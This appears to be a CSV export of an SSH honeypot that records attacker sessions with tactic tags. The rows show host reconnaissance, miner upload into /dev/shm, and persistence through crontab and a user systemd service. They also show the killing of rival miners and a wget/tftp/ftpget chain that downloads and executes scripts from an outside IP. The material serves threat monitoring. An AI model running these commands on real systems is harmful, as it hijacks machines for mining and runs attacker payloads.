1776614072_45.91.7.59_53583_sshshadow,45.91.7.59,ubuntu,,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,,
1776614073_45.91.7.59_53583_sshshadow,45.91.7.59,ubuntu,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776614143_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776614329_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776614491_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776614492_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,,
1776614493_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,,
1776614494_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,"cd ""/tmp"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,,
1776614495_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/tmp"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,,
1776614496_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,,
1776614497_45.91.7.59_4937_sshshadow,45.91.7.59,deploy,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776614528_45.91.7.59_32537_sshshadow,45.91.7.59,test,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776614529_45.91.7.59_32537_sshshadow,45.91.7.59,test,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,,
1776614531_45.91.7.59_32537_sshshadow,45.91.7.59,test,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,,
1776614532_45.91.7.59_32537_sshshadow,45.91.7.59,test,,"cd ""/tmp"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,,
1776614533_45.91.7.59_32537_sshshadow,45.91.7.59,test,,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/tmp"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,,
1776614534_45.91.7.59_32537_sshshadow,45.91.7.59,test,,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,,
1776614535_45.91.7.59_32537_sshshadow,45.91.7.59,test,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776617136_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776617138_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776617140_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776617142_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776617144_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776617147_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776617148_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776617150_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776617152_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776617174_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776617177_45.91.7.59_48193_sshshadow,45.91.7.59,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776630084_89.190.156.34_48236_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776634354_89.190.156.34_48370_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.190.156.19/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 89.190.156.19 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.190.156.19; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.190.156.19 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh,File transfer / staging,True,download_and_execute_chain; download_attempt,exit_code_2,
1776643854_89.190.156.34_48310_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,/bin/false,,False,,exit_code_1,
1776643910_89.190.156.34_47864_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.190.156.19/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 89.190.156.19 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.190.156.19; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.190.156.19 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh,File transfer / staging,True,download_and_execute_chain; download_attempt,exit_code_2,
1776688871_89.190.156.34_41402_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,/bin/false,,False,,exit_code_1,
1776688950_89.190.156.34_46862_sshshadow,89.190.156.34,ubuntu,non_interactive_exec,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.190.156.19/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 89.190.156.19 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.190.156.19; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.190.156.19 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh,File transfer / staging,True,download_and_execute_chain; download_attempt,exit_code_2,
1776701054_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776701055_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776701057_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776701059_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776701061_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776701063_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776701064_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776701066_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776701068_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701071_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701074_149.210.235.123_55390_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701079_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776701081_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776701083_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776701085_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776701087_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776701089_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776701091_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776701092_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776701094_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701099_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701103_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701148_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776701150_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776701152_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776701154_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776701156_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776701158_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776701160_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776701163_149.210.235.123_41352_sshshadow,149.210.235.123,admin,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,,
1776701164_149.210.235.123_41352_sshshadow,149.210.235.123,admin,,"cd ""/tmp"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,,
1776701164_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776701165_149.210.235.123_41352_sshshadow,149.210.235.123,admin,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776701166_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701169_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701173_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776708241_86.38.24.201_13583_sshshadow,86.38.24.201,ubuntu,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776708241_86.38.24.201_29747_sshshadow,86.38.24.201,test,,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,,
1776708242_86.38.24.201_29747_sshshadow,86.38.24.201,test,,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,,
1776708244_86.38.24.201_13583_sshshadow,86.38.24.201,ubuntu,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776708246_86.38.24.201_13583_sshshadow,86.38.24.201,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776708252_86.38.24.201_23197_sshshadow,86.38.24.201,admin,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776708254_86.38.24.201_23197_sshshadow,86.38.24.201,admin,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776708256_86.38.24.201_23197_sshshadow,86.38.24.201,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776708259_86.38.24.201_30277_sshshadow,86.38.24.201,deploy,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776708261_86.38.24.201_30277_sshshadow,86.38.24.201,deploy,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776708263_86.38.24.201_30277_sshshadow,86.38.24.201,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776710429_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776710432_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776710437_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776710440_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776710443_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776710444_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776710446_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776710449_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776710450_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776710462_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776710463_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,,
1776710464_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776710464_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,,
1776710465_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776710466_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776710575_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776710577_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776710579_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776710581_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776710584_149.210.235.123_41472_sshshadow,149.210.235.123,test,,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_23,
1776710585_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776710587_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776710589_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776710591_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776710592_149.210.235.123_38800_sshshadow,149.210.235.123,admin,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,,
1776710593_149.210.235.123_38800_sshshadow,149.210.235.123,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/tmp"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776710595_149.210.235.123_38800_sshshadow,149.210.235.123,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
